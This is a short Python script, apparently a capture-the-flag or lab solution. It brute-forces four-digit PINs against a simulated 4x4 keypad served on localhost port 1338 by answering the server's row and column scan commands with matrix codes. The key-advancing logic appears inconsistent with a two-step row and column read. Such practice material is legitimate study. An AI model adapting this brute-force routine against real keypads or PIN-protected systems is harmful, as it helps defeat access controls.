import socket
import time

# Configuration of the keymap for a keypad.
keymap = {
    '1': ['E0', '0E'],  # First row, first column
    '2': ['D0', '0E'],  # First row, second column
    '3': ['B0', '0E'],  # First row, third column
    'A': ['70', '0E'],  # First row, fourth column

    '4': ['E0', '0D'],  # Second row, first column
    '5': ['D0', '0D'],  # Second row, second column
    '6': ['B0', '0D'],  # Second row, third column
    'B': ['70', '0D'],  # Second row, fourth column

    '7': ['E0', '0B'],  # Third row, first column
    '8': ['D0', '0B'],  # Third row, second column
    '9': ['B0', '0B'],  # Third row, third column
    'C': ['70', '0B'],  # Third row, fourth column

    '*': ['E0', '07'],  # Fourth row, first column
    '0': ['D0', '07'],  # Fourth row, second column
    '#': ['B0', '07'],  # Fourth row, third column
    'D': ['70', '07']   # Fourth row, fourth column
}

# Function to simulate the keypad read.
def simulate_keypad_read(command, key_presses, current_key_to_send):
    if command == 'F0':  # Example: simulate that a key in the first row is pressed
        key = key_presses[current_key_to_send]
        return keymap[key][0] + '\n'
    elif command == '0F':  # Example: simulate that a key in the first column is pressed
        key = key_presses[current_key_to_send]
        return keymap[key][1] + '\n'
    else:
        return 'FF\n'  # Simulate no key pressed or invalid command

# Function to run the client.
def run_client(server_host, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((server_host, server_port))
        print("Connected to server")

        for pin in range(0, 5255):  # Range to include 5254
            key_presses = f"{pin:04d}#"  # Format pin with leading zeros and end with #
            print(key_presses)
            current_key_to_send = 0

            while current_key_to_send < len(key_presses):
                data = sock.recv(1024).decode('utf-8').strip()
                if not data:
                    print("Server closed the connection")
                    break

                print(f"Received from server: {data}")

                response = simulate_keypad_read(data, key_presses, current_key_to_send)
                current_key_to_send += 1

                if response:
                    sock.sendall(response.encode('utf-8'))  # Send response back to the server

                if data == 'quit':  # Optionally handle a quit command
                    print("Quit command received")
                    break
                time.sleep(1)

if __name__ == "__main__":
    SERVER_HOST = 'localhost'  # Server hostname or IP address
    SERVER_PORT = 1338  # Server port
    run_client(SERVER_HOST, SERVER_PORT)
